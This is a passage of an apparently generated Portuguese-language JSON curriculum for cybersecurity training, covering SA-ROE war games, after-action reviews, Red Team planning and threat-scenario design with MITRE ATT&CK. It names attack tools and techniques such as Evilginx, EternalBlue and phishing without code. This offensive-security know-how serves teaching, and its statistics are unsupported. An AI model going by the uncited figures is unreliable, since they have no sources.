                                    "Máquinas alvo virtuais (vulneráveis como Metasploitable)"
                                  ],
                                  "tips": "Grave sessões com tcpdump para replay; comece com ataques low-intensity para calibração.",
                                  "learningObjective": "Executar jogos de guerra cibernéticos testando integração SA-ROE em cenários dinâmicos.",
                                  "commonMistakes": [
                                    "Sobrecarregar rede sem limites de rate",
                                    "Ignorar latência na detecção SA",
                                    "Não pausar para ajustes durante execuções longas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar resultados e validar integração SA-ROE",
                                  "subSteps": [
                                    "Analisar logs no Kibana: métricas de detecção, tempo de resposta ROE.",
                                    "Avaliar eficácia: taxa de falsos positivos/negativos, aderência a ROE.",
                                    "Gerar relatório com visualizações (dashboards customizados).",
                                    "Identificar gaps na integração e propor melhorias.",
                                    "Desmontar ambiente e limpar dados sensíveis."
                                  ],
                                  "verification": "Relatório final com KPIs (ex: 95% detecção, ROE acionada em <5min) e lições aprendidas documentadas.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Kibana/ELK no Security Onion",
                                    "Templates de relatório (Markdown/PDF)"
                                  ],
                                  "tips": "Use queries ELK para métricas quantitativas; compare com benchmarks de jogos de guerra reais.",
                                  "learningObjective": "Avaliar criticamente a integração SA-ROE para decisões operacionais otimizadas.",
                                  "commonMistakes": [
                                    "Foco só em sucessos ignorando falhas",
                                    "Análise superficial sem métricas",
                                    "Não limpar ambiente pós-simulação"
                                  ]
                                }
                              ],
                              "practicalExample": "Simular um ataque APT chinês (baseado em MITRE) contra uma rede militar: Security Onion detecta C2 via SA (tráfego anômalo Zeek), aplica ROE bloqueando IPs e alertando comando em <2min, permitindo contra-medidas simuladas como honeypots.",
                              "finalVerifications": [
                                "Security Onion fully operational com todos sensores ativos.",
                                "Cenários executados com logs completos de SA-ROE.",
                                "Relatório gerado com evidências de integração eficaz.",
                                "Ambiente resetado e limpo para reutilização.",
                                "KPIs atingidos: detecção >90%, resposta ROE <5min.",
                                "Lições aprendidas documentadas e acionáveis."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração do Security Onion (sem erros críticos).",
                                "Qualidade dos cenários: realismo e cobertura de SA-ROE.",
                                "Eficiência na execução: tempo de ciclo e iterações bem-sucedidas.",
                                "Profundidade da análise: uso de métricas quantitativas e qualitativas.",
                                "Documentação completa e profissional.",
                                "Capacidade de troubleshooting durante simulações."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Configuração de sensores e monitoramento de tráfego.",
                                "Análise de Dados: Queries ELK e visualizações em Kibana.",
                                "Programação: Scripts Python/Scapy para automação ROE.",
                                "Gestão de Projetos: Planejamento de cenários e relatórios.",
                                "Ética e Direito: Alinhamento ROE com normas cibernéticas internacionais."
                              ],
                              "realWorldApplication": "Em centros de operações cibernéticas (ex: USCYBERCOM), simulações SA-ROE com Security Onion treinam equipes para responder a ataques estatais reais, reduzindo tempo de Mean Time to Respond (MTTR) em 40% e melhorando aderência a regras de engajamento em conflitos híbridos."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.5.3.3",
                            "name": "Avaliar eficácia de decisões integradas",
                            "description": "Medir métricas como tempo de resposta e taxa de conformidade em after-action reviews, ajustando SA e ROE com base em lições aprendidas de referências como 'Hands-on Ethical Hacking'.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar a estrutura do After-Action Review (AAR)",
                                  "subSteps": [
                                    "Definir os objetivos do AAR, focando em decisões integradas de SA e ROE.",
                                    "Reunir a equipe e registrar eventos chave do exercício ou simulação cibernética.",
                                    "Estabelecer métricas principais: tempo de resposta e taxa de conformidade.",
                                    "Criar um template de AAR com seções para fatos, análise e recomendações.",
                                    "Referenciar capítulos relevantes de 'Hands-on Ethical Hacking' para exemplos de AAR."
                                  ],
                                  "verification": "Template de AAR preenchido com objetivos e métricas definidas, aprovado pela equipe.",
                                  "estimatedTime": "1 hora",
                                  "materials": "Template de AAR (Google Docs ou Excel), livro 'Hands-on Ethical Hacking', gravações do exercício.",
                                  "tips": "Inclua perspectivas de todos os papéis na equipe para evitar viés.",
                                  "learningObjective": "Compreender a importância de uma estrutura padronizada para avaliações pós-exercício.",
                                  "commonMistakes": "Ignorar eventos menores que impactam métricas principais."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Coletar e medir métricas de desempenho",
                                  "subSteps": [
                                    "Registrar tempos de resposta para cada decisão crítica integrada.",
                                    "Calcular taxa de conformidade: decisões que seguiram ROE vs. total de decisões.",
                                    "Usar ferramentas para extrair dados de logs de simulação cibernética.",
                                    "Comparar métricas reais vs. benchmarks estabelecidos.",
                                    "Documentar evidências qualitativas, como feedback de observadores."
                                  ],
                                  "verification": "Planilha com métricas calculadas e gráficos de comparação gerados.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Logs de simulação, planilha Excel ou Google Sheets, cronômetro de eventos.",
                                  "tips": "Automatize cálculos com fórmulas para precisão e rapidez.",
                                  "learningObjective": "Dominar a quantificação de eficácia em cenários operacionais cibernéticos.",
                                  "commonMistakes": "Confundir correlação com causalidade nas métricas."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar lições aprendidas e identificar gaps",
                                  "subSteps": [
                                    "Mapear métricas baixas para falhas na integração de SA e ROE.",
                                    "Discutir em grupo causas raiz usando técnicas como 5 Whys.",
                                    "Referenciar estudos de caso de 'Hands-on Ethical Hacking' para padrões semelhantes.",
                                    "Priorizar lições por impacto em tempo de resposta e conformidade.",
                                    "Gerar hipóteses de melhoria baseadas na análise."
                                  ],
                                  "verification": "Relatório de análise com causas raiz e lições priorizadas.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": "Quadro branco ou ferramenta como Miro, livro 'Hands-on Ethical Hacking'.",
                                  "tips": "Registre discussões em áudio para revisão posterior.",
                                  "learningObjective": "Desenvolver habilidades analíticas para extrair insights acionáveis de dados.",
                                  "commonMistakes": "Focar apenas em sucessos e ignorar falhas."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Ajustar SA e ROE e planejar implementação",
                                  "subSteps": [
                                    "Propor atualizações específicas em procedimentos de SA baseadas em lições.",
                                    "Revisar e refinar ROE para melhorar conformidade e resposta.",
                                    "Criar plano de ação com responsáveis, prazos e KPIs de follow-up.",
                                    "Simular ajustes em um mini-exercício para validação inicial.",
                                    "Documentar mudanças para treinamento futuro."
                                  ],
                                  "verification": "Plano de ação aprovado com simulação bem-sucedida dos ajustes.",
                                  "estimatedTime": "1 hora",
                                  "materials": "Documentos de SA/ROE atuais, ferramenta de simulação cibernética simples.",
                                  "tips": "Teste ajustes em escala reduzida antes de adoção plena.",
                                  "learningObjective": "Aplicar lições aprendidas para otimizar processos operacionais.",
                                  "commonMistakes": "Fazer ajustes genéricos sem métricas de validação."
                                }
                              ],
                              "practicalExample": "Em um jogo de guerra cibernético simulando um ataque DDoS, a equipe tomou decisões integradas de SA (detectar ameaça) e ROE (autorizar contra-ataque). No AAR, mediu-se tempo de resposta de 15 min (meta: 10 min) e conformidade de 80% (meta: 95%). Ajustou-se ROE para clarificar thresholds de engajamento, referenciando ethical hacking scenarios do livro.",
                              "finalVerifications": [
                                "Métricas de tempo de resposta e conformidade calculadas com precisão >95%.",
                                "Pelo menos 3 lições aprendidas identificadas e priorizadas.",
                                "Ajustes propostos em SA/ROE documentados e validados em simulação.",
                                "Plano de ação com responsáveis e prazos definidos.",
                                "Relatório de AAR completo e compartilhado com a equipe.",
                                "Melhoria projetada nas métricas em pelo menos 20%."
                              ],
                              "assessmentCriteria": [
                                "Precisão na coleta e cálculo de métricas (nota 1-10).",
                                "Profundidade da análise de causas raiz (cobertura de gaps).",
                                "Relevância e acionabilidade das lições aprendidas.",
                                "Qualidade dos ajustes propostos em SA/ROE.",
                                "Completude do plano de ação e verificações finais.",
                                "Integração de referências como 'Hands-on Ethical Hacking'."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Dados: Uso de métricas quantitativas e visualizações.",
                                "Liderança e Trabalho em Equipe: Facilitação de discussões em AAR.",
                                "Gestão de Projetos: Criação de planos de ação com KPIs.",
                                "Ética e Direito: Alinhamento de ROE com normas éticas cibernéticas."
                              ],
                              "realWorldApplication": "Em operações de defesa cibernética reais, como resposta a incidentes em redes críticas (ex: energia ou finanças), AARs com essas métricas otimizam SA/ROE, reduzindo tempo de mitigação de ameaças e garantindo conformidade legal, similar a exercícios do CERT ou agências governamentais."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.5.3.4",
                            "name": "Aplicar integração em planejamento de Red Team",
                            "description": "Incorporar SA-ROE no planejamento de cenários de ameaça, garantindo operações eficazes e legais em ambientes de teste.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Avaliar Requisitos de SA e ROE para o Exercício de Red Team",
                                  "subSteps": [
                                    "Revisar documentação legal e regulatória aplicável ao ambiente de teste.",
                                    "Identificar elementos chave de Situational Awareness (SA) como rede, ativos e ameaças potenciais.",
                                    "Mapear Rules of Engagement (ROE) específicas, incluindo limites de escopo, horários e ações permitidas.",
                                    "Consultar stakeholders para alinhar expectativas de conformidade.",
                                    "Documentar riscos associados à não adesão a SA-ROE."
                                  ],
                                  "verification": "Checklist preenchida confirmando todos os requisitos de SA e ROE identificados e documentados.",
                                  "estimatedTime": "2-4 horas",
                                  "materials": "Documentos de ROE, diagramas de rede, atas de reuniões com stakeholders, ferramentas de documentação como Markdown ou Confluence.",
                                  "tips": "Priorize ROE legais para evitar violações inadvertidas; use templates padronizados para avaliação.",
                                  "learningObjective": "Compreender e catalogar integralmente os componentes de SA e ROE relevantes ao contexto operacional.",
                                  "commonMistakes": "Ignorar ROE não técnicas como horários de operação ou subestimar impactos de SA em ativos críticos."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Desenvolver Cenários de Ameaça Integrando SA-ROE",
                                  "subSteps": [
                                    "Criar perfis de ameaças baseados em inteligência de SA atualizada.",
                                    "Incorporar restrições de ROE em cada cenário, definindo gatilhos de parada e escopos.",
                                    "Simular fluxos de ataque com checkpoints de verificação SA-ROE.",
                                    "Priorizar cenários por risco e viabilidade legal.",
                                    "Validar cenários com um peer review inicial."
                                  ],
                                  "verification": "Cenários documentados com fluxogramas mostrando integração explícita de SA-ROE em cada fase.",
                                  "estimatedTime": "4-6 horas",
                                  "materials": "Ferramentas de modelagem como Draw.io ou Lucidchart, relatórios de inteligência de ameaças (MITRE ATT&CK), templates de cenários.",
                                  "tips": "Use matrizes de decisão para equilibrar realismo de ameaça com conformidade ROE.",
                                  "learningObjective": "Construir cenários realistas que respeitem limites operacionais e legais.",
                                  "commonMistakes": "Sobrecarregar cenários com complexidade desnecessária, ignorando ROE e causando falhas legais."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Incorporar SA-ROE no Plano Operacional de Red Team",
                                  "subSteps": [
                                    "Estruturar o plano com seções dedicadas a monitoramento SA contínuo.",
                                    "Definir protocolos de escalonamento baseados em violações ROE detectadas via SA.",
                                    "Integrar ferramentas de logging e alertas para rastreamento em tempo real.",
                                    "Estabelecer regras de debriefing pós-exercício focadas em lições de SA-ROE.",
                                    "Revisar e aprovar o plano com equipe legal e de conformidade."
                                  ],
                                  "verification": "Plano operacional completo com anexos de SA-ROE auditáveis e aprovação assinada.",
                                  "estimatedTime": "3-5 horas",
                                  "materials": "Templates de plano de Red Team, ferramentas de colaboração como MS Teams ou Jira, software de monitoramento como Splunk ou ELK Stack.",
                                  "tips": "Inclua triggers automatizados para pausar operações se ROE for violado.",
                                  "learningObjective": "Integrar SA-ROE de forma operacional e mensurável no planejamento geral.",
                                  "commonMistakes": "Tratar SA-ROE como apêndice em vez de elemento central do plano."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar e Refinar o Plano Através de Simulação",
                                  "subSteps": [
                                    "Executar tabletop exercise simulando cenários com foco em SA-ROE.",
                                    "Coletar feedback da equipe sobre aderência e eficácia.",
                                    "Identificar gaps e iterar no plano.",
                                    "Testar ferramentas de SA em ambiente controlado.",
                                    "Finalizar versão aprovada com lições aprendidas incorporadas."
                                  ],
                                  "verification": "Relatório de simulação com métricas de conformidade SA-ROE >95% e plano refinado versionado.",
                                  "estimatedTime": "4-8 horas",
                                  "materials": "Ambiente de simulação (VMs isoladas), gravações de sessões, formulários de feedback.",
                                  "tips": "Grave simulações para análise posterior e treinamento futuro.",
                                  "learningObjective": "Garantir robustez do plano através de validação prática iterativa.",
                                  "commonMistakes": "Pular simulações, assumindo que o plano teórico é suficiente."
                                }
                              ],
                              "practicalExample": "Em um exercício de Red Team para uma empresa financeira, integre SA (monitoramento de tráfego de rede via SIEM) e ROE (proibido acessar dados de clientes reais) no planejamento de um cenário de ransomware simulado: defina gatilhos SA para detectar 'infecção' e pausar se ROE for ameaçado, garantindo teste eficaz sem riscos legais.",
                              "finalVerifications": [
                                "Todos os cenários incluem checkpoints explícitos de SA-ROE.",
                                "Plano possui aprovações de stakeholders legais e técnicos.",
                                "Métricas de simulação mostram 100% de aderência a ROE.",
                                "Documentação de riscos mitiga potenciais violações.",
                                "Ferramentas de monitoramento SA estão configuradas e testadas.",
                                "Debriefing template inclui revisão SA-ROE."
                              ],
                              "assessmentCriteria": [
                                "Clareza e completude na integração de SA-ROE (30%)",
                                "Realismo e viabilidade dos cenários de ameaça (25%)",
                                "Robustez dos mecanismos de verificação e escalonamento (20%)",
                                "Documentação auditável e rastreável (15%)",
                                "Evidências de validação através de simulações (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Direito Cibernético: Conformidade com leis como LGPD/GDPR em ROE.",
                                "Gerenciamento de Projetos: Integração de riscos em planejamento ágil.",
                                "Ética Profissional: Decisões baseadas em SA para operações responsáveis.",
                                "Análise de Dados: Uso de SA para inteligência acionável."
                              ],
                              "realWorldApplication": "Em operações de pentest para bancos ou agências governamentais, essa integração previne multas regulatórias e maximiza o valor de exercícios de Red Team, permitindo simulações de ataques avançados como APTs enquanto mantém operações 100% legais e controladas."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  }
                ]
              },
              {
                "id": "10.1.4",
                "name": "Planejamento e Criação de Cenários de Ameaça",
                "description": "Foca no desenvolvimento de estratégias e simulações realistas de ameaças cibernéticas para treinamento.",
                "totalSkills": 49,
                "atomicTopics": [
                  {
                    "id": "10.1.4.1",
                    "name": "Definição de Cenários de Ameaça Cibernética",
                    "description": "Conceitos fundamentais e importância dos cenários para simular ameaças realistas em treinamentos de Red Team.",
                    "individualConcepts": [
                      {
                        "id": "10.1.4.1.1",
                        "name": "Definição de Cenário de Ameaça Cibernética",
                        "description": "Compreensão dos conceitos básicos que definem um cenário de ameaça cibernética, incluindo atores, vetores de ataque, objetivos e impactos esperados, conforme práticas de Red Team descritas em guias como 'Red Team Development and Operations'.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.1.1.1",
                            "name": "Identificar componentes essenciais de um cenário",
                            "description": "Reconhecer e listar os elementos principais de um cenário de ameaça cibernética, como perfil do adversário (TTPs - Tactics, Techniques and Procedures), alvos primários, fases do ataque (reconhecimento, exploração, pós-exploração) e métricas de sucesso, baseando-se em mindsets de adversários reais.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos de um Cenário de Ameaça Cibernética",
                                  "subSteps": [
                                    "Defina o que é um cenário de ameaça cibernética e sua importância no planejamento de operações.",
                                    "Liste os quatro componentes essenciais: perfil do adversário (TTPs), alvos primários, fases do ataque e métricas de sucesso.",
                                    "Estude exemplos reais de relatórios MITRE ATT&CK para mapear componentes.",
                                    "Crie um glossário pessoal com termos chave como TTPs, reconhecimento, exploração e pós-exploração.",
                                    "Compare cenários fictícios vs. reais para identificar padrões comuns."
                                  ],
                                  "verification": "Crie um mapa mental com os quatro componentes essenciais e valide com uma fonte confiável como MITRE ATT&CK.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "MITRE ATT&CK Framework (site oficial)",
                                    "Notebook ou ferramenta de mind mapping (ex: XMind)",
                                    "Vídeo introdutório sobre cenários cibernéticos (YouTube ou Cybrary)"
                                  ],
                                  "tips": "Comece com definições simples antes de mergulhar em exemplos complexos para construir uma base sólida.",
                                  "learningObjective": "Identificar e definir os componentes principais de um cenário de ameaça cibernética.",
                                  "commonMistakes": [
                                    "Confundir TTPs com ferramentas específicas em vez de táticas gerais.",
                                    "Ignorar o mindset do adversário ao focar apenas em fases técnicas."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar o Perfil do Adversário e TTPs",
                                  "subSteps": [
                                    "Pesquise perfis de adversários reais (ex: APT28, Lazarus Group) usando frameworks como Diamond Model ou MITRE.",
                                    "Mapeie TTPs: Tactics (por quê), Techniques (como), Procedures (específicos).",
                                    "Identifique mindsets: motivado por dinheiro, espionagem ou disruption.",
                                    "Crie um perfil fictício baseado em um adversário real, listando 5-10 TTPs relevantes.",
                                    "Compare TTPs de diferentes adversários para padrões comuns."
                                  ],
                                  "verification": "Desenvolva um perfil de adversário com pelo menos 3 TTPs detalhados e cruze-referencie com MITRE ATT&CK.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "MITRE ATT&CK Navigator",
                                    "Relatórios de threat intelligence (ex: Mandiant M-Trends)",
                                    "Planilha Excel para mapeamento de TTPs"
                                  ],
                                  "tips": "Use a matriz ATT&CK para visualizar TTPs; foque em táticas de alto nível primeiro.",
                                  "learningObjective": "Construir perfis de adversários realistas incluindo TTPs e mindsets.",
                                  "commonMistakes": [
                                    "Listar apenas técnicas sem contexto tático.",
                                    "Subestimar o impacto do mindset motivacional no perfil."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Mapear Alvos Primários, Fases do Ataque e Métricas de Sucesso",
                                  "subSteps": [
                                    "Defina alvos primários: sistemas, dados ou usuários críticos em um ambiente hipotético.",
                                    "Descreva fases do ataque: Reconhecimento (gather intel), Exploração (vulnerabilidades), Pós-exploração (persistência, exfiltração).",
                                    "Estabeleça métricas de sucesso do atacante: tempo para breach, dados exfiltrados, impacto financeiro.",
                                    "Integre com perfil do adversário: como TTPs se alinham às fases.",
                                    "Crie um fluxograma das fases para um cenário específico."
                                  ],
                                  "verification": "Produza um fluxograma com alvos, fases e 3 métricas de sucesso validadas contra um caso real.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Ferramenta de fluxograma (ex: Lucidchart, Draw.io)",
                                    "Cyber Kill Chain de Lockheed Martin",
                                    "Casos de estudo como SolarWinds ou Colonial Pipeline"
                                  ],
                                  "tips": "Pense como o atacante: o que define 'sucesso' para eles?",
                                  "learningObjective": "Mapear alvos, fases e métricas em relação ao perfil do adversário.",
                                  "commonMistakes": [
                                    "Focar apenas em fases técnicas sem alvos específicos.",
                                    "Definir métricas vagas como 'acesso concedido' em vez de quantificáveis."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar e Listar Componentes em um Cenário Completo",
                                  "subSteps": [
                                    "Combine todos os componentes em uma lista estruturada para um cenário hipotético.",
                                    "Revise e refine a lista para clareza e completude.",
                                    "Simule um debriefing: apresente o cenário para um par e receba feedback.",
                                    "Adapte o cenário para diferentes mindsets de adversários.",
                                    "Documente lições aprendidas em um template reutilizável."
                                  ],
                                  "verification": "Gere uma lista completa de componentes para um novo cenário e autoavalie com checklist.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Template de cenário (Google Docs ou Word)",
                                    "Checklist de componentes essenciais",
                                    "Vídeo de red teaming para inspiração"
                                  ],
                                  "tips": "Mantenha a lista concisa: 1 página máximo por cenário.",
                                  "learningObjective": "Sintetizar componentes em uma identificação acionável de cenário.",
                                  "commonMistakes": [
                                    "Sobrecarregar com detalhes irrelevantes.",
                                    "Não alinhar métricas com objetivos do adversário."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um cenário de ransomware como o WannaCry: Perfil do adversário (Lazarus-like, TTPs: phishing para exploit EternalBlue); Alvos primários (redes Windows desatualizadas em hospitais); Fases (reconhecimento via scans SMB, exploração via exploit, pós-exploração com criptografia e demanda); Métricas (número de máquinas criptografadas, pagamentos recebidos em BTC).",
                              "finalVerifications": [
                                "Liste corretamente os 4 componentes essenciais sem omissões.",
                                "Mapeie pelo menos 3 TTPs reais de um adversário conhecido.",
                                "Descreva fases do ataque com exemplos de técnicas.",
                                "Defina 3 métricas quantificáveis de sucesso do atacante.",
                                "Crie um perfil de adversário integrado a um cenário completo.",
                                "Valide o cenário contra um framework padrão como MITRE."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de TTPs e mindsets (80% match com fontes reais).",
                                "Completude da lista de componentes (todos os 4 presentes e detalhados).",
                                "Relevância das fases e alvos ao perfil do adversário.",
                                "Quantificabilidade das métricas de sucesso.",
                                "Clareza e estrutura na apresentação do cenário.",
                                "Criatividade na adaptação a mindsets reais."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Inteligência: Ligação com threat intelligence e OSINT.",
                                "Psicologia Comportamental: Entender mindsets e motivações de adversários.",
                                "Gestão de Riscos: Identificar alvos primários em avaliações empresariais.",
                                "Estratégia Militar: Paralelos com doutrinas de guerra cibernética (ex: OODA Loop)."
                              ],
                              "realWorldApplication": "Usado em exercícios de red team/blue team para simular ataques reais, planejamento de defesas proativas em SOCs e criação de cenários para treinamentos de incident response em organizações como bancos ou governos."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.1.1.2",
                            "name": "Diferenciar cenários fictícios de realistas",
                            "description": "Analisar exemplos de cenários para distinguir aqueles baseados em ameaças reais (ex.: APTs como APT28) de cenários genéricos, utilizando referências bibliográficas como 'Hands-on Ethical Hacking' para validar autenticidade.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender as Definições de Cenários Fictícios e Realistas",
                                  "subSteps": [
                                    "Defina cenário fictício: narrativas inventadas sem base em eventos reais, comuns em ficção ou treinamentos genéricos.",
                                    "Defina cenário realista: baseado em ameaças documentadas, como APTs (Advanced Persistent Threats).",
                                    "Liste critérios diferenciais: realismo técnico, histórico de ataques reais, fontes verificáveis.",
                                    "Revise exemplos iniciais: compare um enredo de filme hacker com um relatório de APT28.",
                                    "Anote diferenças chave em um quadro comparativo."
                                  ],
                                  "verification": "Quadro comparativo preenchido com pelo menos 5 diferenças identificadas.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Papel ou ferramenta digital para quadro (ex: Google Sheets), acesso à internet para definições básicas.",
                                  "tips": "Use analogias cotidianas, como diferenciar notícia falsa de fato jornalístico.",
                                  "learningObjective": "Dominar conceitos fundamentais para distinção inicial de cenários.",
                                  "commonMistakes": "Confundir complexidade técnica com realismo; ignorar fontes primárias."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Pesquisar Ameaças Reais e Exemplos Históricos",
                                  "subSteps": [
                                    "Pesquise APT28 (Fancy Bear): leia relatórios do MITRE ATT&CK ou FireEye.",
                                    "Identifique táticas reais: spear-phishing, exploits zero-day, persistência em redes.",
                                    "Colete cenários genéricos: busque exemplos de CTFs ou simulações hollywoodianas.",
                                    "Extraia evidências: timestamps, vítimas reais, impactos mensuráveis.",
                                    "Compile uma lista de 3 ameaças reais vs 3 fictícias."
                                  ],
                                  "verification": "Lista compilada com fontes citadas para cada item.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Livro 'Hands-on Ethical Hacking', sites MITRE ATT&CK, FireEye reports (PDFs baixados).",
                                  "tips": "Priorize fontes primárias como relatórios governamentais para maior credibilidade.",
                                  "learningObjective": "Adquirir conhecimento factual sobre ameaças reais para benchmark.",
                                  "commonMistakes": "Focar apenas em notícias sensacionalistas sem dados técnicos."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Cenários com Referências Bibliográficas",
                                  "subSteps": [
                                    "Selecione 2 cenários para análise: um real (APT28) e um fictício.",
                                    "Aplique checklist: verifique técnicas usadas contra frameworks reais (ex: Cyber Kill Chain).",
                                    "Valide com 'Hands-on Ethical Hacking': compare com capítulos sobre APTs.",
                                    "Pontue similaridades/diferenças: use escala de 1-10 para realismo.",
                                    "Documente achados em relatório curto."
                                  ],
                                  "verification": "Relatório com pontuações e citações bibliográficas incluídas.",
                                  "estimatedTime": "75 minutos",
                                  "materials": "'Hands-on Ethical Hacking' (capítulos relevantes), Cyber Kill Chain diagram (impresso ou digital).",
                                  "tips": "Anote páginas específicas do livro para referências rápidas.",
                                  "learningObjective": "Desenvolver habilidade analítica usando validação externa.",
                                  "commonMistakes": "Subjetividade excessiva sem métricas quantitativas."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar Diferenciação e Sintetizar Conhecimento",
                                  "subSteps": [
                                    "Crie um cenário híbrido e classifique-o como real ou fictício.",
                                    "Debata com parceiro ou autoavaliação: justifique com evidências.",
                                    "Revise erros passados e ajuste checklist pessoal.",
                                    "Teste com 3 novos exemplos independentes.",
                                    "Resuma lições aprendidas em mindmap."
                                  ],
                                  "verification": "Mindmap completa com classificações corretas em todos testes.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "Ferramenta de mindmap (ex: MindMeister), exemplos adicionais de cenários.",
                                  "tips": "Simule pressão temporal para mimetizar cenários de planejamento real.",
                                  "learningObjective": "Consolidar habilidade através de prática iterativa.",
                                  "commonMistakes": "Generalizar demais sem evidências específicas por cenário."
                                }
                              ],
                              "practicalExample": "Analise o cenário 'APT28 invade eleições via spear-phishing no DNC (real, baseado em relatórios Mueller)' vs 'Hacker solitário derruba rede global em 5 minutos (fictício, como em filmes). Use 'Hands-on Ethical Hacking' para validar táticas de persistência do APT28.",
                              "finalVerifications": [
                                "Classificar corretamente 90% dos cenários testados como real ou fictício.",
                                "Citar pelo menos 3 fontes bibliográficas por análise.",
                                "Checklist pessoal aplicada consistentemente em exemplos novos.",
                                "Quadro comparativo com diferenças técnicas claras.",
                                "Relatório de síntese com mindmap validada.",
                                "Autoavaliação mostrando compreensão de APTs reais."
                              ],
                              "assessmentCriteria": [
                                "Precisão na distinção: 80%+ acertos em testes cegos.",
                                "Uso de evidências: citações de fontes reais em todas análises.",
                                "Profundidade técnica: referência a frameworks como MITRE ATT&CK.",
                                "Estrutura lógica: steps seguidos com substeps completos.",
                                "Criatividade na aplicação: cenários híbridos bem diferenciados.",
                                "Clareza na documentação: relatórios legíveis e concisos."
                              ],
                              "crossCurricularConnections": [
                                "História: Análise de eventos geopolíticos como eleições 2016.",
                                "Jornalismo: Verificação de fatos em reportagens cibernéticas.",
                                "Lógica e Filosofia: Distinção entre verdade empírica e especulação.",
                                "Estatística: Avaliação probabilística de plausibilidade de cenários."
                              ],
                              "realWorldApplication": "Em equipes de Red Team/Blue Team, garante que exercícios de wargames usem cenários realistas baseados em APTs como APT28, melhorando preparação para defesas cibernéticas autênticas em organizações governamentais ou corporativas."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.1.1.3",
                            "name": "Mapear vetores de ameaça comuns",
                            "description": "Descrever vetores iniciais de ataque como phishing, exploração de vulnerabilidades zero-day ou supply chain attacks, e como eles se integram a um cenário completo para simulações de Red Team.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar e Catalogar Vetores de Ameaça Comuns",
                                  "subSteps": [
                                    "Pesquise fontes confiáveis como MITRE ATT&CK para listar vetores iniciais como phishing, spear-phishing, exploração de zero-day e supply chain attacks.",
                                    "Classifique cada vetor por fase do ciclo de ataque (ex: Initial Access para phishing).",
                                    "Documente características chave: método de entrega, alvos típicos e payloads comuns.",
                                    "Crie uma tabela comparativa com frequência, impacto e exemplos históricos.",
                                    "Revise a lista para incluir pelo menos 5 vetores adicionais além dos especificados."
                                  ],
                                  "verification": "Verifique se a tabela inclui pelo menos 8 vetores com colunas completas e referências citadas.",
                                  "estimatedTime": "2 horas",
                                  "materials": "MITRE ATT&CK framework online, planilha Google Sheets ou Excel, artigos de cibersegurança (ex: Krebs on Security).",
                                  "tips": "Use frameworks como Diamond Model para contextualizar vetores além de listas simples.",
                                  "learningObjective": "Compreender a taxonomia de vetores de ameaça iniciais e sua classificação.",
                                  "commonMistakes": "Confundir vetores iniciais com táticas de persistência; ignorar vetores emergentes."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Descrever Detalhes Técnicos dos Vetores Específicos",
                                  "subSteps": [
                                    "Para phishing: Explique engenharia social, tipos (email, SMS), ferramentas como Evilginx.",
                                    "Para zero-day: Detalhe descoberta, exploits (ex: buffer overflow), exemplos como Log4Shell.",
                                    "Para supply chain: Descreva injeção em software de terceiros, vetores como SolarWinds Orion.",
                                    "Inclua diagramas de fluxo de ataque para cada um.",
                                    "Analise defesas comuns e por que falham (ex: falta de MFA em phishing)."
                                  ],
                                  "verification": "Crie diagramas validados por auto-revisão ou peer review, cobrindo método, execução e evasão.",
                                  "estimatedTime": "3 horas",
                                  "materials": "Ferramentas de diagramação (Draw.io ou Lucidchart), relatórios de vulnerabilidades (CVE database), vídeos tutoriais éticos.",
                                  "tips": "Foquem em 'como' o atacante executa, não em replicar; use sandboxes para demos seguras.",
                                  "learningObjective": "Dominar mecânicas técnicas e sociais de vetores iniciais chave.",
